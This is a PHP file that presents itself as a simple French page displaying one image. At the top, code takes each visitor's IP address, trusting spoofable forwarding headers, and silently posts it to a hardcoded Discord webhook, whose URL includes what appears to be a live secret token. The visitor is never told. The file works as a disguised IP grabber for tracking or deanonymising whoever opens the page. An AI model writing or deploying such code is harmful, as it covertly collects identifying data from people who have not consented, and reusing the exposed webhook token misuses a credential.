<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();

// URL du webhook Discord
$webhook_url="https://discord.com/api/webhooks/1355704665228185720/HmLhYwMJYO11AgCzYWb9BBxcsaXejudkdMiYO5C3mcFDtGgcIO773e42EJ8Dq0Te3aTK";

// Message à envoyer
$data = json_encode(["content" => "L'adresse IP du visiteur est : " . $ip]);

// Initialisation de cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Exécution et fermeture
$response = curl_exec($ch);
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affichage d'une image</title>
</head>
<body>
    <img src="image.jpg" alt="Image exemple" width="300">
</body>
</html>